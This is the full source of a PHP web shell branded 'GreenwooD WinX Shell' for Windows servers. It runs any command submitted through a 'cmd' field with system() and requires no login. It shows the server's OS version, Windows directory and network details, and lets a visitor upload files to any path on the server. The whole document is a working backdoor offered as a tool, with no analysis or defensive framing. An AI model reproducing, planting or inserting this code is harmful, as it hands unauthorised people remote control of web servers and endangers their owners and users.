<html><head><title>-:[GreenwooD]:- WinX Shell</title></head>
<body bgcolor="#FFFFFF" text="#000000" link="#0066FF" vlink="#0066FF" alink="#0066FF">
<?php

// -----:[ Start infomation ]:-----
// It's simple shell for all Win OS.
// Created by greenwood from n57
//
// ------:[ End infomation]:-------


set_magic_quotes_runtime(0);
//*Variables*

//-------------------------------

$veros = `ver`;
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$windir = `echo %windir%`;


//------------------------------
   if( $cmd == "" ) {
    $cmd = 'dir /OG /X';
  }
//-------------------------------


//------------------------------

print "<table  style=\"font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 9px; border: 1px #000000 dotted\"  border=\"0\" cellspacing=\"1\" cellpadding=\"2\"  >";
print    "<tr>";
print      "<td><font color=\"#990000\">You:</font></td>" ;
print      "<td> ".$_SERVER['REMOTE_ADDR']." [<font color=\"#0033CC\">".$host."</font>] </td>" ;
print    "</tr>";
print    "<tr>";
print      "<td><font color=\"red\">Version OS:</font></td>" ;
print      "<td><font color=\"#0066CC\"> $veros </font></td>";
print    "</tr>";
print    "<tr>";
print     "<td><font color=\"#990000\">Server:</font></td>";
print      "<td><font color=\"#0066CC\">".$_SERVER['SERVER_SIGNATURE']."</font></td>";
print    "</tr>";
print    "<tr>";
print     "<td><font color=\"#990000\">Win Dir:</font></td>";
print      "<td><font color=\"#0066CC\"> $windir </font></td>";
print    "</tr>";
print  "</table>";
print  "<br>";

//------- [netstat -an] and [ipconfig] and [tasklist] ------------
print "<form name=\"cmd_send\" method=\"post\" action=\"$PHP_SELF\">";
print "<input style=\"font-family: Verdana; font-size: 12px; width:10%;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" type=\"submit\" name=\"cmd\" value=\"netstat -an\">";
print "&nbsp;&nbsp;&nbsp;";
print "<input style=\"font-family: Verdana; font-size: 12px; width:10%;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" type=\"submit\" name=\"cmd\" value=\"ipconfig\">";
print "&nbsp;&nbsp;&nbsp;";
print "<input style=\"font-family: Verdana; font-size: 12px; width:10%;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" type=\"submit\" name=\"cmd\" value=\"tasklist\">";
print "</form>";
//-------------------------------


//-------------------------------

print "<textarea style=\"width:100%; height:50% ;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" readonly>";
       system($cmd);
print "</textarea>";
print "<br>";

//-------------------------------

print "<form name=\"cmd_send\" method=\"post\" action=\"$PHP_SELF\">";
print "<font face=\"Verdana\" size=\"1\" color=\"#990000\">CMD: </font>";
print "<br>";
print "<input style=\"font-family: Verdana; font-size: 12px; width:50%;border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" type=\"text\" name=\"cmd\" value=\"$cmd\">";
print " <input style = \"font-family: Verdana; font-size: 12px; background-color: #FFFFFF; border: #666666; border-style: solid; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" type=\"submit\" name=\"_run\" value=\"Run\">";
print "</form>";

//-------------------------------

print "<form  enctype=\"multipart/form-data\" action=\"$PHP_SELF\" method=\"post\">";
print "<font face=\"Verdana\" size=\"1\" color=\"#990000\">Upload:</font>";
print "<br>";
print "<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">";
print "<font face=\"Verdana\" size=\"1\" color=\"#990000\">File: </font><input style=\"font-family: Verdana; font-size: 9px; background-color: #FFFFFF; border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" name=\"userfile\" type=\"file\">";
print " <font face=\"Verdana\" size=\"1\" color=\"#990000\">Filename on server: </font> <input style=\"font-family: Verdana; font-size: 9px;background-color: #FFFFFF; border: #000000; border-style: dotted; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" name=\"serverfile\" type=\"text\">";
print" <input style =\"font-family: Verdana; font-size: 9px; background-color: #FFFFFF; border: #666666; border-style: solid; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px\" type=\"submit\" value=\"Send\">";
print"</form>";

?>


<?

// Script for uploading
 if (is_uploaded_file($userfile)) {
move_uploaded_file($userfile, $serverfile);
}

?>


<center><font face="Verdana" size="1" color="#000000">Created by -:[GreenwooD]:- </font></center>
</body></html>